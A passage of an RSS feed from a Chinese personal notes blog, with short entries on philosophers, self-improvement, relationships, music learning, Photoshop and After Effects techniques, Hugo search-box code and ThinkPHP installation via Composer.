李重光的乐理书，可能在你们眼里还算不错，但是我看完之后还是搞不明白它说的这一切是怎么运用在作曲中的，
后来我有了 VPN，在油管上打开了新世界，在众多即兴，乐理的视频教程中，
我现在可以在任何一首歌里面即兴演奏，写歌也是手到擒来。
音乐学习的最好方法不是看书，而是看视频，因为视频是声音和图像的结合体，
比如我现在讲 Lydian 音阶，它的音阶结构是 1 2 3 #4 5 6 7，只讲这个其实你并没有真正懂它的音响效果，
这个 youtube 频道从图像，PPT，演奏示例，记忆法等如手，教你如何记忆指板位置，如何进行特定和声进行下的 solo 即兴和创作。
这个世界上不存在真正无法理解的知识，只存在不会表达的糟糕教学者，
大家都是人，为什么你能懂的东西我就懂不了呢？
就算我笨一些，能在你脑子里运行的东西也能在我的脑子里运行，只不过可能速度慢一些。
教材的目的是什么？教材的目的是让学生尽可能地不依靠任何外界帮助，仅仅依靠你的教材就能学会你想表达的知识。
可以说，我国在此方面做的奇差无比。
国内这些教材其实牵动了很多人的利益，比如学校的利益，编写者的利益等等，</description>
    </item>
    
    <item>
      <title>亚里士多德</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E4%BA%9A%E9%87%8C%E5%A3%AB%E5%A4%9A%E5%BE%B7/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E4%BA%9A%E9%87%8C%E5%A3%AB%E5%A4%9A%E5%BE%B7/</guid>
      <description>亚里士多德 没有天生的概念 柏拉图认为大自然中是先有 “马的理型”，再有我们感官世界中所看到的马匹，因此他认为 “鸡的观念先于鸡”。
而他却认为“马的理型”，是我们人类看到若干匹马后，所形成的概念；因此马的 “理型” “形式” 是不存在的；它认为马的 “理型” 或 “形式” 就是马的特征。
某个事物的 “理型” 或 “形式” 存在于这个事物之中，因为所谓的 “理型” 或“ 形式” 就是这个事物所有的特征。
如果世间存在 ”马的理型”，那这个“马的理型”又从何而来？这个 ”马的理型” 是否会模仿另外一匹马?
我们所拥有的任何想法和意念都是透过我们过去所看到、听到的事物，从而进入我们的意识。
一件事物的形式乃是它的特征 自然界的每一种变化，都是物质将自身的 “潜能” 转变为“实现”的结果。
自然界的每一个事物都可能实现或达成某一种特定的 “形式”。
一个事物的 “形式” 或 “特征” ，不但说明了这个事物的潜能，也说明了它的极限。举个例子，一个鸡蛋可以变成一只鸡（鸡蛋的潜能）；但并不一定会顺利的变成一只鸡，因为它有可能变成人类餐桌上的佳肴（未实现鸡蛋的潜能）；同理，鸡蛋显然不能变成一只鹅（鸡蛋并不具有变成鹅的潜能）。
事物都有“质料”和“形式”。
目的因 他认为自然界的每一件事物都有其存在的“目的”或“任务”。举个例子，天空之所以会下雨，其目的因就是植物和动物需要雨水才能生长。
他将世间的事物彻底分门别类，同时还创立了《逻辑学》这门学科。
自然的层级 无生物，比如石头、水滴、树木只能通过外力改变，而生物则有潜能自行改变。
宇宙中必然有一位“上帝”（最初推动者）推动世间中所有的运作，即上帝位于大自然的最顶端；并且他认为这位“上帝”是宇宙万物各种活动的“目的因”。
对女人的看法 女性在某些方面并不完整，认为女性是未完成的男人；甚至认为女人只是土壤，而男人却是“播种者”；男人提供“形式”（男人决定“质料”的“形式”或“特征”），而女人则仅贡献“质料”（组成事物的物质）。</description>
    </item>
    
    <item>
      <title>人为什么要努力</title>
      <link>https://note.yxzi.xyz/note/view/grow/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8A%AA%E5%8A%9B/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/grow/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8A%AA%E5%8A%9B/</guid>
      <description>人为什么要努力 人之所以持续不断的努力，并不完全是被正能量驱使，而是被恐惧驱动的。
因为你看见了一个更好的自己被困在旧躯壳里，你恐惧且不甘，想要把 Ta 救出来，为此你必须付出你的努力。</description>
    </item>
    
    <item>
      <title>人生是一场马拉松</title>
      <link>https://note.yxzi.xyz/note/view/grow/%E4%BA%BA%E7%94%9F%E6%98%AF%E4%B8%80%E5%9C%BA%E9%A9%AC%E6%8B%89%E6%9D%BE/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/grow/%E4%BA%BA%E7%94%9F%E6%98%AF%E4%B8%80%E5%9C%BA%E9%A9%AC%E6%8B%89%E6%9D%BE/</guid>
      <description>人生是一场马拉松 成功的道路并不像想象得那么拥挤，因为在人生的马拉松长路上，绝大部分人跑不到一半就主动退下来了。
到后来，剩下的少数人不是嫌竞争对手太多，而是发愁怎样找一个同伴陪自己一同跑下去。
因此，教育是一辈子的事情，笑到最后的人是一辈子接受教育的人。
回过头来看，一些过去比我们读书更优秀，在起跑线上抢到了更好位置的人，早已放弃了人生的马拉松，
我们能够跑得更远，仅仅是因为我们还在跑，如此而已。
急功近利不好，悲观绝望也不好</description>
    </item>
    
    <item>
      <title>人要会做选择</title>
      <link>https://note.yxzi.xyz/note/view/grow/%E4%BA%BA%E8%A6%81%E4%BC%9A%E5%81%9A%E9%80%89%E6%8B%A9/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/grow/%E4%BA%BA%E8%A6%81%E4%BC%9A%E5%81%9A%E9%80%89%E6%8B%A9/</guid>
      <description>人要会做选择 优秀的选择能力本身就是一个领导者的必备素质，也叫作决策能力。
它包含了对大量信息的收集、分析和仔细对比，这是一个极为辛苦的认知过程。
而它也包含了在信息不那么对称的情况下进行一把小小的赌博。
我们必须努力学会真正清晰地思考和决策方式，才能让自己是“做选择”，而不是“做赌博”。</description>
    </item>
    
    <item>
      <title>人要先努力</title>
      <link>https://note.yxzi.xyz/note/view/grow/%E4%BA%BA%E8%A6%81%E5%85%88%E5%8A%AA%E5%8A%9B/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/grow/%E4%BA%BA%E8%A6%81%E5%85%88%E5%8A%AA%E5%8A%9B/</guid>
      <description>人要先努力 一 先努力，你会早一些看到，自己在 24 小时连轴转最努力的情况下，能成就什么。
而后你才能知道，哪些东西是自己可以去博一博的，哪些东西是只可远观万万不可亵玩的。
先努力，你会早一些看到，自己在豁出了命去努力、非常努力、比较努力、有点努力、没有努力的情况下，
分别会得到什么同时又失去什么。
而后你才能判断，阶段性的目标值得自己投入多少、什么时候该给自己放假，
哪些情况下需要再加把力、哪些情况下该见好就收，见不好割肉止损也得收。
每次给自己换挡后，都能坦然的面对即将到来的得失。
二 先努力，你会早一些看到这个世界真实的样子，然后才有可能找到，适合自己的位置。
早一些看到，你才有选择的余地、才有调整的空间、才可能有急流勇退和金盆洗手的资格。
早一些看到，你才能分辨得出，谁给的是经验、谁喂的是鸡汤、谁提炼经验里的鸡精来忽悠你、谁拿浓汤宝当经验自己洗自己。
否则，你会每天都见识到更大的世界，在一惊一乍的不淡定与对未知的卑微中，度过自己的一生。
三 在非黄金高峰期搭地铁，只要你肯多往前后走一走，总会发现，一节空到不正常的车厢，找到五个人松散占据着一整排的座位，
而前后相邻的两节车厢，熙熙攘攘到胸都快被挤掉了，每停一站都要感受一次个人力量的渺小，每个换乘点都是决战紫荆之巅。
一步天堂一步地狱，不多迈几步，怎么能知道哪步是这一步？
在足球场上，有这么一种人，他们开赛后先频频犯规，一次比一次尺度大，一次比一次口味重。
当他们通过一系列试探了解到当值裁判的尺度之后，会把侵犯对手当成常规性的防守手段，比赛屡屡因他们被吹停，
但他们却很少得牌，还经常引得对手被红牌罚下。
先努力了，你才可以找出一个性价比高的姿势，从头到尾都死死抱住扶手、从头到尾都跟着对手狂奔。
确实，你够努力、你更努力、你可 tmd 的努力呢，但是，活的那么苦，结果还不好，除了感动中国，谁都感动不。
下车了才发现隔壁车厢在拍摄维秘外景的比基尼展示环节，而你在薄薄的人墙之外和狐臭男斗争了一个小时。
比赛结束了才明白原来只要不扯掉对手的球裤别的什么都能干，谁都能干，扳手可以带，少林功夫可以用。
四 有一个朋友，刚毕业去了我们那个年代 500 强外企的代表，宝洁，当管理培训生。
三年后突然辞职考公务员，问其原因，她说她受不了自己回到家里都习惯性的用祈使句和父母说话，
这份工作让她的性格扭曲到自己都不喜欢自己了，复习几个月后，她考上了。
几年后我再次去广州出差，得知她已经辞掉了公务员的工作去了我们那个年代著名的养老外企，壳牌。
我问她为什么的时候她没有再开口，但我能感觉出，那时她的笑容，是最接近大学时期的。
五 先排除了最不适合自己的，剩下的，都是足够滋润的。
要是先不努力呢？伟大的无产阶级革命家列宁同志曾经教导过我们：少壮不努力，老大徒伤悲；老二造暗器，老三当总理。
年轻时得过且过还是以后优哉游哉，自己选咯。
其实，当你明白人要先努力那天起，你就不需要再努力了，以后的，都是生活。</description>
    </item>
    
    <item>
      <title>什么是阅读</title>
      <link>https://note.yxzi.xyz/note/view/read/%E4%BB%80%E4%B9%88%E6%98%AF%E9%98%85%E8%AF%BB/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/read/%E4%BB%80%E4%B9%88%E6%98%AF%E9%98%85%E8%AF%BB/</guid>
      <description>什么是阅读 我认为，阅读仅仅是只是一种兴趣，和玩游戏、健身、看漫画没有本质的区别。
 我上大学去买烧烤，烧烤摊老板说，现在的大学生，不知道学了这么久都学了什么。
每天有饭吃有学上，图书馆那么大，还动不动觉得生活没意义，我看还是游戏打的太多。
我就微笑了一下。
他说，你还别不信，你看过唐吉诃德么？
我说，看过啊。
老板的兴趣浓厚了起来，给我讲他就看过那几本书，爱不释手，以前太穷，现在太忙，最喜欢的就是唐吉诃德。
我们讨论了一会书里搞笑的内容，说到他把书的故事当真实的时候做出的癫狂事。
烧烤好了，我就走了。
 老板很开心，说这么久，终于有个大学生和他聊聊这本书。
这种感觉我觉得自己特别能理解，小时候大家开开心心拿书互相交换，聊天讨论。
没人去说中心思想，没人觉得是为了什么。那时候真开心啊。
突然有一天，别人看着我拿书，都会问，读书是个好习惯，你怎么养成的，怎么坚持的。
那以后，我就很少再和任何人讨论一本书了。
这件事我印象特别深，读书就是一种乐趣，不管对方是清洁工，生意人，教授。
读书本身应该是开开心心和别人聊聊天，就像讨论一下电视剧一样。
并不会让任何人成为一个成功的人，不知道什么时候读书和成功学挂钩了，我觉得单纯的只是快乐而已，只是乐趣而已。
看书和不看书的人的区别，就是看书的人只能和看书的人讨论一本书，
不看书的人呢，可以和另外的人讨论高尔夫、羽毛球、健身、或者随便任何一个自己的爱好。</description>
    </item>
    
    <item>
      <title>休谟</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E4%BC%91%E8%B0%9F/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E4%BC%91%E8%B0%9F/</guid>
      <description>休谟 如果你被热炉子烫到你会马上得到一个印象，事后你会回到终究被烫到的这件事，这就是休谟所谓的观念，两者的不同在于印象，比事后的回忆要更加强烈，也更加生动。印象是在我们心中形成挂观念的直接原因。
不可知论者，他怀疑上帝是否真的存在。因为他觉得上帝，不过是某些元素所组成的，就像天使一样，是由人和翅膀所组成的。
你相信石头会掉在地上的原因是你见过它发生过很多次。事情发生一次又一次之后，你会变得非常习惯，以至于每次你放开石头时，总会期待发生同样的事，所以就形成了我们所谓的自然界不变的法则。</description>
    </item>
    
    <item>
      <title>制作光晕</title>
      <link>https://note.yxzi.xyz/note/technology/software/photoshop/%E5%88%B6%E4%BD%9C%E5%85%89%E6%99%95/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/software/photoshop/%E5%88%B6%E4%BD%9C%E5%85%89%E6%99%95/</guid>
      <description>制作光晕  新建透明图层。 将该图层填充为纯黑色。 菜单栏——滤镜——渲染——镜头光晕——调整参数——确定。  </description>
    </item>
    
    <item>
      <title>制作剪影</title>
      <link>https://note.yxzi.xyz/note/technology/software/photoshop/%E5%88%B6%E4%BD%9C%E5%89%AA%E5%BD%B1/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/software/photoshop/%E5%88%B6%E4%BD%9C%E5%89%AA%E5%BD%B1/</guid>
      <description>制作剪影  导入图像。 工具栏——快速选择工具。 建立选区。 属性栏——创建或调整选区——调整参数——输出设置——输出到：图层蒙版——确定。 图层面板——创建新的填充或调整图层——纯色——选择颜色——确定。 将纯色图层作为图像的背景。 复制一次图像层——Ctrl + J。 选择位于下方的图像层。 图层面板——添加图层样式——颜色叠加——调整颜色——确定。 移动工具——将位于下方的图像层调整到合适的位置。  </description>
    </item>
    
    <item>
      <title>制作灰度图</title>
      <link>https://note.yxzi.xyz/note/technology/software/photoshop/%E5%88%B6%E4%BD%9C%E7%81%B0%E5%BA%A6%E5%9B%BE/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/software/photoshop/%E5%88%B6%E4%BD%9C%E7%81%B0%E5%BA%A6%E5%9B%BE/</guid>
      <description>制作灰度图  新建——颜色模式——灰度。 工具栏——渐变工具——黑白渐变。 调整渐变样式。  </description>
    </item>
    
    <item>
      <title>努力与命运</title>
      <link>https://note.yxzi.xyz/note/view/grow/%E5%8A%AA%E5%8A%9B%E4%B8%8E%E5%91%BD%E8%BF%90/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/grow/%E5%8A%AA%E5%8A%9B%E4%B8%8E%E5%91%BD%E8%BF%90/</guid>
      <description>努力与命运 我只要认定了宿命的存在，也就意味着自我存在开始的一生百年，
所有轨迹都已经刻在某块不知名的命运石板上了，此后种种，按序发生。
那么，我的努力，只是石板上的一行字，这件事是必然发生的。
而努力改变了所谓命运，其实也是刻在石板上的一部分。
那么，我们通过努力而改变了命运这件事，本身就是既定的命运的一部分而已。
因此命运不可以被改变，只要你相信命运，则一切改变皆是命运本身中的必然发生的事罢了。
比如朱元璋出身贫寒，后登基九五，他大概认为自己改变了命运。
而如果真的有一块关于他的命运石板的话，则上边一定刻着一行字：
“朱重八于洪武元年即位于应天府，时年四十岁正。”</description>
    </item>
    
    <item>
      <title>博客添加搜索功能</title>
      <link>https://note.yxzi.xyz/note/technology/frame/hugo/%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/hugo/%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</guid>
      <description>博客添加搜索功能 HTML 代码 然后在网页内需要添加搜索栏的合适位置添加以下代码，一般放在顶部导航栏：
&amp;lt;div class=&amp;#34;search&amp;#34;&amp;gt; 	&amp;lt;i class=&amp;#34;material-icons search-icon search-start&amp;#34;&amp;gt;search&amp;lt;/i&amp;gt; 	&amp;lt;input type=&amp;#34;text&amp;#34; class=&amp;#34;search-input&amp;#34; placeholder=&amp;#34;Searching...&amp;#34; /&amp;gt; 	&amp;lt;i class=&amp;#34;material-icons search-icon search-clear&amp;#34;&amp;gt;clear&amp;lt;/i&amp;gt; 	&amp;lt;div class=&amp;#34;search-results&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; 上面的clear是一个清除输入框内容的图标，search-results是用于输出匹配到的结果的板块；
CSS 代码 .search { 	position: relative; 	height: 30px; 	text-align: right; 	line-height: 30px; 	padding-right: 10px; }  .search .search-icon { 	float: right; 	height: 100%; 	margin: 0 10px; 	line-height: 30px; 	cursor: pointer; 	user-select: none; }  .</description>
    </item>
    
    <item>
      <title>双重曝光</title>
      <link>https://note.yxzi.xyz/note/technology/software/after-effects/%E5%8F%8C%E9%87%8D%E6%9B%9D%E5%85%89/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/software/after-effects/%E5%8F%8C%E9%87%8D%E6%9B%9D%E5%85%89/</guid>
      <description>双重曝光  导入绿幕抠像后的素材与背景 素材。 将背景素材放到抠像绿幕素材的下面。 背景素材——轨道遮罩—Alpha。  </description>
    </item>
    
    <item>
      <title>好感、喜欢与爱</title>
      <link>https://note.yxzi.xyz/note/view/bisexual/%E5%A5%BD%E6%84%9F%E5%96%9C%E6%AC%A2%E4%B8%8E%E7%88%B1/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/bisexual/%E5%A5%BD%E6%84%9F%E5%96%9C%E6%AC%A2%E4%B8%8E%E7%88%B1/</guid>
      <description>好感、喜欢与爱 对你有好感 好感只是一种浅层次的情感，没有依赖的成份，是一对多。
比如你找 Ta 说话，Ta 会以一种不错的态度对你，会很乐意你说话。
聊天的时候，还会主动开启话题……可是，这只是一种好感，
Ta 只是觉得你是一个有魅力的人，当然只是觉得你有魅力，并未上升为喜欢。
Ta 并不了解你，你的童年怎样，你将来想过怎样的生活，而且，时间上相处的也不长，
相应的没有任何情感依赖的成份，离开你，Ta 的世界也依然在转，所以 Ta 不会很主动地去找你聊天，陪你说话，找你玩……
有点喜欢你 如果 Ta 对你产生了一定程度的情感依赖，那么好感便上升为了喜欢。
这个时候你们会知晓彼此的过去与未来，对彼此的三观，事业等等都有一定的了解，
同时你们相处的时间够长，有了一定的情感基础，也就是有了情感上的依赖。
已经爱上了你 你们彼此都在对方的视野里展现了最真实的自我，比如邋遢的行为，崩溃的瞬间，又或者是愤怒的吵架。
Ta 的未来规划里有你；
Ta 会心疼你，深沉的爱着你；
Ta 会自卑，Ta 为了你成为更好的自己；
Ta 会管束你，Ta 希望你能自为更好的自己；
爱情不是委曲求全，爱情是相互的存在。
真正的爱情会成就你，也会成就 Ta ，成就的是两个人。
而不是打着为爱献身的幌子，欺骗你无故的牺牲。
同样，女生喜欢你，也是喜欢你的个性，千万不要为了教条而随意雕琢自己。
喜欢打球，就让 Ta 站在旁边为你呐喊；
喜欢跳水，就让 Ta 爱上游泳馆；
培养 Ta 早睡早起的良好习惯，跟 Ta 一起去上自习；
告诉 Ta 不要为自己辛苦熬夜赶论文，告诉 Ta 这些都是值得的。
这一切的一切都不是一个人在做。
不是男生单方面费尽心思辛苦不堪地努力成为一个优秀的男朋友，
也不是女生自己因为男生不接电话而躲在被窝里委屈地哭泣，反思自己哪里不好。
爱情，是两个人的事，是双方互相成就。</description>
    </item>
    
    <item>
      <title>学习的方法</title>
      <link>https://note.yxzi.xyz/note/view/study/%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%96%B9%E6%B3%95/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/study/%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%96%B9%E6%B3%95/</guid>
      <description>学习的方法 无论是什么学习，如果有这件事情来说对你重要，也有必要，
但是你却讨厌它，那么请你在讨厌的时候立马去学习它，学到你喜欢它的时候立刻中断它。
因为人都是追求快乐的，你学到情绪快乐的时候就中断，你的情绪就会带领你再来领略一次那种似曾相识的快乐，
即便你的情绪不会主动带你来，也不要紧，因为你至少不会在心理上抗拒了。
所以，做一件事的时候，当这件事情给你的感觉是非常愉悦的时候，请立刻停下来。</description>
    </item>
    
    <item>
      <title>安装 ThinkPHP</title>
      <link>https://note.yxzi.xyz/note/technology/frame/thinkphp/%E5%AE%89%E8%A3%85-thinkphp/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/thinkphp/%E5%AE%89%E8%A3%85-thinkphp/</guid>
      <description>安装 ThinkPHP 安装 Composer 在 Windows 中，你需要下载并运行 Composer
安装 composer 时开启 openssl 配置，目录为（php.ini 配置文件的目录中的 php.exe）
比如 D:\phpstudy_pro\Extensions\php\php7.3.4nts
第一次报错  [Composer\Downloader\TransportException]curl error 28 while downloading https://repo.packagist.org/packages.json: Timeout was reached 解决方法：修改全局文件(推荐) composer config -g repo.packagist composer https://packagist.phpcomposer.com
第二次报错  [InvalidArgumentException]Could not find package topthink/think with version 6.0.x-dev. 切换 composer 镜像地址：阿里云镜像
composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
安装 Thinkphp 开发版 我们这里下载开发版的 ThinkPhp
composer create-project topthink/think=6.0.x-dev tp
在上一步创建的 tp 文件夹中执行 php think run（确保当前目录有 think 文件）</description>
    </item>
    
    <item>
      <title>康德</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E5%BA%B7%E5%BE%B7/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E5%BA%B7%E5%BE%B7/</guid>
      <description>康德 理性主义者将理性的重要性说的太过火了，而经验主义者则过分强调感官的经验。
事物本身和我眼中的事物是不一样的。 我们永远不发确知事物本来的面貌。我们所知道的只是我们眼中所看到的事物
你的行为是否合乎德正取决于你是否出自善意的为之，并不是取决于你的行为后果。
只有我们自己确知我们纯粹是为了遵守道德法则而行动时，我们的行为才是自由的。</description>
    </item>
    
    <item>
      <title>弗洛伊德</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E5%BC%97%E6%B4%9B%E4%BC%8A%E5%BE%B7/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E5%BC%97%E6%B4%9B%E4%BC%8A%E5%BE%B7/</guid>
      <description>弗洛伊德 性的欲望合需求事实上是人类天性中很自然而且很重要的一部分。
非理性的冲动经常左右我们的思想、梦境和行动。这种不理性的冲动可能是反映我们的基本需求
假设在这个演讲厅这么多安安静静、专心听讲的观众里面，有一个人很不安分。他毫无礼貌地大笑，又喋喋不休，并把脚动来动去，使我无法专心演讲。后来我只好宣布我讲不下去了。 这时，你们当中有三四个大汉站起来，在一阵扭打后，把那个搅局的人架了出去。于是这个搅局者就被‘压抑’了，我因此可以继续讲下去。可是为了避免那个被赶走的人再度进来捣乱，那几位执行我的意志的先生便把他们的椅子搬到门口并坐在那儿‘防御’，以继续压抑的动作。现在，如果你们将这个场景转移到心理，把这个大厅称为‘意识’，而把大厅外面称为‘潜意识’，那么你们就可以明白‘压抑’作用的过程了。”
“可是这个捣乱者坚持要再进来。至少那些被我们压抑的想法和冲动是这样的。这些想法不断从我们的潜意识浮现，使我们经常处于一种压力之下。这是我们为什么常常会说一些本来不想说的话或做一些本来不想做的事的缘故。因为我们的感觉和行动会受到潜意识的鼓动。”
我们每天的生活里面都充满了这类潜意识的机转。我们时常会忘记某个人的名字，在说话时摸弄自己的衣服，或移动房间里随意放置的物品。我们也时常结结巴巴或看似无辜地说错话，写错字。但佛洛伊德指出，这些举动事实上并不像我们所想的那样是意外的或无心的。这些错误事实上可能正泄漏我们内心最深处的秘密。
我们应该做的其实是不要太过努力把不愉快的记忆埋藏在潜意识中。因为那就像是试图把水鼠巢穴的入口堵住一样。水鼠一定会从其他的洞口进入花园，因此，让意识与潜意识之间的门半遮半掩事实上是一件很健康的事。
是不是你愈努力去忘掉一件事情，你在潜意识里就愈容易想起这件事?”
梦境乃是以伪装的方式满足人被压抑的愿望。
我们将我们所见、所经验的一切事物都贮存在我们意识深处的某个地方，而这些印象可能会再度浮现。有时我们会突然‘脑中一片空白’，然后过了一会，‘差点就想起来了’，然后再度‘猛然想起’
合理化 意思就是说，我们自己不愿意承认，也不愿意告诉别人我们做某一件事的真正动机，因为这个动机是让人无法接受的
投射 它会将把我们内心试图压抑的特点转移到别人身上。譬如说一个很吝啬的人会说别人斤斤计较，而一个不愿承认自己满脑子想着性的人可能愈容易对别人成天想着性的样子感到愤怒</description>
    </item>
    
    <item>
      <title>感情中的决策与试探</title>
      <link>https://note.yxzi.xyz/note/view/bisexual/%E6%84%9F%E6%83%85%E4%B8%AD%E7%9A%84%E5%86%B3%E7%AD%96%E4%B8%8E%E8%AF%95%E6%8E%A2/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/bisexual/%E6%84%9F%E6%83%85%E4%B8%AD%E7%9A%84%E5%86%B3%E7%AD%96%E4%B8%8E%E8%AF%95%E6%8E%A2/</guid>
      <description>感情中的决策与试探 男生通常像狗，思路是决策型的。
女生通常像猫，思路是试探型的。
你一回家，猫跟狗都蹲在门边。
狗必须跟你黏糊一阵，猫就是过来看看情况。
关于信任 男生跟你说，我所有事都信你。
这是一个决策的开始。
女生跟你说，我所有事都信你。
这是一个试探的开始。
关于吃饭 男生说，吃什么都行。
这是个决策，他真的吃什么都行。
女生说吃什么都行。
这是个试探，你得挨个问她吃什么才行。
关于意见 男生问，我穿这件衣服好看吗？
这是个决策，你说好看，他就选那件。
女生问，我穿这件衣服好看吗？
这是个试探，你说好看，她会去试下一件。
关于暧昧 男生说，我不计较你和男同事来往。
这是个决策，他不一定有底，他是决定不计较。
女生说，我不计较你和女同事来往。
这是个试探，具体要看你和哪个女同事来往。
关于礼物】 男生说，亲爱的你不需要给我买礼物。
这是个决策，你不买没任何风险。
女生说，亲爱的你不需要给我买礼物。
这是个试探，试试看你是不是真不想买。
关于分手 女生认为自己传递的是一个【试探】
但他最终告诉你的是一个【决策】</description>
    </item>
    
    <item>
      <title>斯宾诺莎</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E6%96%AF%E5%AE%BE%E8%AF%BA%E8%8E%8E/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E6%96%AF%E5%AE%BE%E8%AF%BA%E8%8E%8E/</guid>
      <description>斯宾诺莎 一元论者，他认为世界万物都是可以被分解为一个真实的“实体”物质。</description>
    </item>
    
    <item>
      <title>朋友间的关系是如何变淡的</title>
      <link>https://note.yxzi.xyz/note/view/gam/%E5%A5%BD%E5%8F%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB%E6%98%AF%E5%A6%82%E4%BD%95%E5%8F%98%E6%B7%A1%E7%9A%84/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/gam/%E5%A5%BD%E5%8F%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB%E6%98%AF%E5%A6%82%E4%BD%95%E5%8F%98%E6%B7%A1%E7%9A%84/</guid>
      <description>好友间的关系是如何变淡的 为什么没人承认，是社会资源地位见识差距变大，
你的苦闷他无法理解，他的彷徨在你而言，是变相炫耀。
两个人无话可说，只能叙旧，直到过去被反复咀嚼，淡而无味，
又碍于情面，怕被指责势利，还要勉强维持点赞的情分。
当然，有很多超越阶级的友谊，但两者的见识和思辨力，一定是对等的。
许多年少时闯祸的朋友，只能被拿来怀念，许多因为恩情而结缘的人，也只适合报恩。
朋友是需要交换观点的人，而不仅仅是交换感情。
我越来越觉得，要从同路者中寻找朋友，而不是硬拽着朋友一道上路。
到了分岔口，温柔道别就好，过年时发一句“羊年吉祥”，也好过两个人口不对心地把酒话桑麻。
物质差距不一定能冲淡友情，精神差距是一定会的。
同时，物质差距也让人的精神层面有所改变，所以超越阶层的友谊很罕见。
老朋友在一起，甚至什么都不用说，只是端起酒杯喝酒，心里确是安宁和踏实。</description>
    </item>
    
    <item>
      <title>期望值管理</title>
      <link>https://note.yxzi.xyz/note/view/gam/%E6%9C%9F%E6%9C%9B%E5%80%BC%E7%AE%A1%E7%90%86/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/gam/%E6%9C%9F%E6%9C%9B%E5%80%BC%E7%AE%A1%E7%90%86/</guid>
      <description>期望值管理 影视剧中往往有这样的观感：一个地痞或者土匪，平日无恶不作。
到了最后一集，哎，这货突然抗日了，例如《大宅门》里的三爷。
这时候观众对其好感度会突然爆棚，甚至超过许多没有爆点的正面角色，前几十集的劣迹简直一笔勾销。
这就是期望值在前期被编剧压低之后的福利。
我们刚进入一个团队时，如果一开始就大招尽出，会导致周围人和领导对你的期望值不断升高。
最后总会有一次你满足不了对方的要求，这时候对你的负面评价也会随之而起，甚至会低过一直表现平平的同仁。
有人将其总结为“不胜任陷阱”，因为在一个上升通道中，只要达到了上层的期望，就会被继续提拔，
直到提拔到一个你不能胜任的岗位，让所有人失望，这个升迁过程才会结束。
这一点在情场上也依然适用，你会发现浪子回头会获得相当的赞美，许多女人甚至可以不计较你之前是个多么烂的人。
但老实巴交的“好好男人”一旦被抓到一次不老实就立刻被打入“渣男”的行列再也不得翻身。
